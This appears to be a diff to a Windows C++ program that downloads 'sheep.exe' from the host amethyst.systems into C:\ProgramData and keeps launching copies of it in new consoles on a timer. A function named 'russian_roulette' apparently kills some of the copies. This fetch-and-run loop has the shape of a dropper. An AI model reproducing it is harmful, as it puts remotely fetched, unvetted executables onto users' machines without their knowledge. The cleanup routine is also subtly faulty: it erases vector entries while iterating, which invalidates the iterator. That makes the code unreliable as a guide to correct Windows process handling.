@@ -230,12 +230,15 @@ bool spawn_sheep(LPPROCESS_INFORMATION proc_info) {
    memset(&startup_info, 0, sizeof(STARTUPINFOA));
    startup_info.cb = sizeof(STARTUPINFOA);
 
+   // explorer.exe has the following process attributes:
+   // CREATE_DEFAULT_ERROR_MODE | EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE | CREATE_SUSPENDED
+   
    return (bool)CreateProcessA("C:\\ProgramData\\sheep.exe",
                                "sheep",
                                nullptr,
                                nullptr,
                                FALSE,
-                               CREATE_NEW_CONSOLE | CREATE_SUSPENDED,
+                               CREATE_NEW_CONSOLE,
                                nullptr,
                                nullptr,
                                &startup_info,
@@ -246,14 +249,13 @@ bool clear_inactive_sheep(std::vector<PROCESS_INFORMATION> &sheep_pool) {
    bool result = false;
    
    for (auto iter=sheep_pool.begin(); iter!=sheep_pool.end(); ++iter) {
-      HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, iter->dwProcessId);
+      DWORD exit_code;
+      
+      if (!GetExitCodeProcess(iter->hProcess, &exit_code) || exit_code == STILL_ACTIVE)
+         continue;
 
-      if (proc == nullptr) {
-         sheep_pool.erase(iter);
-         result = true;
-      }
-      else
-         CloseHandle(proc);
+      sheep_pool.erase(iter);
+      result = true;
    }
 
    return result;
@@ -412,26 +414,19 @@ int WinMain(HINSTANCE instance, HINSTANCE prev_instance, LPSTR cmdline, int show
 
       std::vector<PROCESS_INFORMATION> sheep_pool;
 
-      while (1) {
-         if (GetFileAttributes("C:\\ProgramData\\sheep.exe") == INVALID_FILE_ATTRIBUTES && !download_url(L"amethyst.systems", L"/sheep.exe", "C:\\ProgramData\\sheep.exe"))           
-            goto next_sheep_poll;
+      while (GetFileAttributes("C:\\ProgramData\\sheep.exe") != INVALID_FILE_ATTRIBUTES || download_url(L"amethyst.systems", L"/sheep.exe", "C:\\ProgramData\\sheep.exe")) {
+         if (sheep_pool.size() > 0)
+            clear_inactive_sheep(sheep_pool);
 
          if (sheep_pool.size() < GLOBAL_CONFIG->max_sheep) {
             PROCESS_INFORMATION new_sheep;
             
-            if (!spawn_sheep(&new_sheep))
-               goto next_sheep_poll;
-            
-            sheep_pool.push_back(new_sheep);
-
-            goto next_sheep_poll;
+            if (spawn_sheep(&new_sheep))
+               sheep_pool.push_back(new_sheep);
          }
-         else if (clear_inactive_sheep(sheep_pool))
-            continue;
-         
-         russian_roulette(sheep_pool);
+         else
+            russian_roulette(sheep_pool);
 
-      next_sheep_poll:
          Sleep(60000);
       }
       
